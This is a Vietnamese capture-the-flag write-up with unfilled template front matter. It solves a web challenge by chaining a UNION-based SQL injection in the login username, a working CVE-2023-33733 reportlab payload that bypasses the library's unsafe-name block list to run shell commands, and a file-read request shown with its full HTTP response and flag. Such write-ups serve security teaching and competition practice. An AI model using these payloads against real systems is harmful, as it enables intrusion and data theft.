---
title: TITLE
date: 'XXXX-XX-XX'
draft: false
authors: ['AUTHOR']
tags: ['XXX', 'YYY']
summary: 'XXX'
canonical: ''
---

## TITLE

## Table of Contents

1. [Source](#Source)
2. [Solution](#Solution)

## Main Content

### SQLi username

Ở đây thì khi login, ta thấy chương trình sẽ gọi tới hàm `getUser` trong database
```python
user, status = database.get_user(username, password)
```

Nhìn vào file `database.py`, ta thấy được cách hàm này hoạt động:

```python
def get_user(self, username, password):
    password_bytes = password.encode("utf-8")
    query = text(f"SELECT * FROM users WHERE username = '{username}'")
    print("Query:", query)
    user = self.session.execute(query).fetchone()
    if not user:
        return None, False
    if bcrypt.checkpw(password_bytes, user.password.encode("utf-8")):
        return user, True
    return None, False
```

Đoạn code trên bị lỗi SQL Injection ở chỗ `username` khi nó được truyền vào query mà không được escape. Để ý class user có dạng

```python
class Users(db):
    __tablename__ = "users"
    id = Column(Integer, primary_key=True, autoincrement=True)
    username = Column(String)
    password = Column(String)
    is_admin = Column(Boolean, default=True)
```

Như vậy để có thể login với user có quyền admin ta tạo tài khoản với user bất kỳ. Ở đây là `shisuite`, sau đó ta sẽ login với `username` như sau:

```
' union select id, username, password, 1 from users where username%3d'shisuite
```

Như vậy câu query sẽ trở thành
```
SELECT * FROM users WHERE username = '' union select id, username, password, 1 from users where username='shisuite'
```

Nó sẽ trả về user `shisuite` nhưng mà có quyền admin

### CVE-2023-33733
Do có chức năng liên quan tới chuyển file txt thành pdf trong file `app.py` (/convert, /view_pdf), mình đã cố tìm cách để có thể khai thác bằng cách tìm điểm yếu trong code nhưng hardcore vcl.

Sau cùng thì như HTB Machine Easy, có thể là nó sẽ có CVE nào đó, nên mình đã search google "python pdf cve" và ra ngay một con hàng trên đầu
```
https://github.com/c53elyas/CVE-2023-33733
```

Đây là CVE của reportlab (được sử dụng trong `convert_pdf.py`) có thể inject code vào pdf. Tuy nhiên thì mình thử kiểu gì cũng éo được. Sau cùng thì tư duy `mineme2` lại khiến mình thử diff lib reportlab của bài này với bản gốc xem có gì hay ho (cụ thể là bản 3.6.12)

Ở file `rl_safe_eval.py` đã filter hết các từ sau:
```python
__rl_unsafe__ = frozenset('''all any breakpoint builtins co_argcount co_cellvars co_code co_consts co_filename co_firstlineno 
							co_flags co_freevars co_kwonlyargcount co_lnotab co_name co_names co_nlocals co_posonlyargcount 
							co_stacksize co_varnames cr_await cr_code cr_frame cr_origin cr_running ctype enumerate filter frozenset 
							func_code func_defaults func_doc func_globals func_name f_back f_builtins f_code f_exc_traceback f_exc_type 
							f_exc_value f_globals f_lasti f_lineno f_locals f_restricted f_trace gi_code gi_frame gi_running gi_yieldfrom 
							globals hasattr im_class im_func im_self iter list locals map max min next pow range reversed set sorted 
							sum system tb_frame tb_lasti tb_lineno tb_next vars __annotations__ __code__ __defaults__ __func__ __globals__ 
							__iter__ __kwdefaults__ __module__ __name__ __qualname__ __self__'''.split()
```
Challenge đã filter `pow` và `system` nên ta sẽ đổi thành `popen` và `type` để bypass filter

Final payload:
```
<para> <font color="[ [ getattr(type,Word('__globals__'))['os'].popen('cat /flag*.txt > /tmp/hehe.pdf').read() for Word in [orgTypeFun('Word', (str,), { 'mutated': 1, 'startswith': lambda self, x: False, '__eq__': lambda self,x: self.mutate() and self.mutated < 0 and str(self) == x, 'mutate': lambda self: {setattr(self, 'mutated', self.mutated - 1)}, '__hash__': lambda self: hash(str(self)) })] ] for orgTypeFun in [type(type(1))] ] and 'red'">                exploit                </font>            </para>
```

### LFI 

```python
@app.route("/view_pdf", methods=["GET"])
def view_pdf():
    token = request.cookies.get("token")
    if not token:
        return redirect(url_for("login"))
    
    try:
        jwt_payload = jwt.decode(token, JWT_KEY, algorithms=[JWT_ALG])
    except jwt.ExpiredSignatureError:
        return redirect(url_for("login"))
    except jwt.InvalidTokenError:
        return redirect(url_for("login"))
    
    if not jwt_payload.get("login"):
        return redirect(url_for("login"))
    
    if jwt_payload.get('login') and is_admin(jwt_payload):
        pdf_filename = request.args.get('f')
        if not pdf_filename:
            return render_template("error.html", title="Error", error="No file provided", redirect_url="/convert"), 400
        return send_file(os.path.join(UPLOAD_FOLDER, pdf_filename), as_attachment=False)
```

Đoạn code này bị LFI nên có thể đọc file bất kỳ, vậy exccute đưa flag ra `/tmp/hehe.pdf` và đọc file flag là xong

```
GET /view_pdf?f=/tmp/hehe.pdf HTTP/2
Host: hells.ehc-fptu.club
Cookie: token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJsb2dpbiI6dHJ1ZSwidXNlcm5hbWUiOiJ0cnVuZ3BxIiwiaXNfYWRtaW4iOjF9.xhq-NmIQhPKFkV2Ua19nfn9esgEYIo2LvAac6g5kmvs
Sec-Ch-Ua: "Not_A Brand";v="8", "Chromium";v="120"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Windows"
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.71 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-Dest: embed
Referer: https://hells.ehc-fptu.club/convert
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9
Priority: u=0, i

HTTP/2 200 OK
Date: Wed, 11 Sep 2024 12:03:09 GMT
Content-Type: application/pdf
Content-Length: 59
Content-Disposition: inline; filename=hehe.pdf
Last-Modified: Wed, 11 Sep 2024 12:00:33 GMT
Cache-Control: no-cache
Etag: "1726056033.212105-59-540542130"
Vary: Cookie, Accept-Encoding
Set-Cookie: session=; Expires=Thu, 01 Jan 1970 00:00:00 GMT; Max-Age=0; Secure; HttpOnly; Path=/; SameSite=Lax
Cf-Cache-Status: BYPASS
Accept-Ranges: bytes
Report-To: {"endpoints":[{"url":"https:\/\/a.nel.cloudflare.com\/report\/v4?s=06L56Ghj9h69RbqcnkwHAsBPtIRla6BNeK7q2EU0nb6g1LF4XlRDZDQiWoZRcZYeB5%2BSArn%2BIHBIJDdDwRcXbY6FYLYVRSc5SqcdirAK2zE0%2B3M%2FZMya6IB1JNHiMRIBgxYVk4hQ"}],"group":"cf-nel","max_age":604800}
Nel: {"success_fraction":0,"report_to":"cf-nel","max_age":604800}
Strict-Transport-Security: max-age=2592000
X-Content-Type-Options: nosniff
Server: cloudflare
Cf-Ray: 8c1783528c409ca7-SIN
Alt-Svc: h3=":443"; ma=86400

EHC{3asy_brute_f0rce_jwt_4nd_expl0it_ed1ted_CVE-2023-33733}
```
